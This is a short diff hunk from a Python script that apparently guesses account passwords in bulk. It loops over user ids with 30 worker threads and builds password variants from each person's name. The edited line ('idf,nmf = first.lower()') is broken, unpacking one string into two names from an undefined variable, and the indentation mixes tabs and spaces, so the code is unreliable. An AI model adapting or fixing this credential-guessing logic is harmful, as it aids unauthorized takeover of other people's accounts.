@@ -246,7 +246,7 @@ class __xxx__:
             with sarfrazssb(max_workers=30) as ssbworld:
                 for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
-                    idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+                    idf,nmf = first.lower()
 	            	frs = nmf.split(' ')
 	            	pwv = []
 	            	if len(nmf)<6:
